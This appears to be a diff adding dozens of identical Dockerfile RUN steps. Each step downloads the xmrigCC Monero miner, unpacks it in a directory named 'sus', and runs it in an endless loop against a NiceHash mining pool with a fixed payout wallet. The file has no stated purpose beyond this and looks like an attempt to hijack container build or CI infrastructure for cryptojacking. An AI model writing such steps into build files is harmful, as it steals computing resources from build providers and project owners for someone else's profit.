+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN apt-get update && apt-get install wget -y && mkdir sus && cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
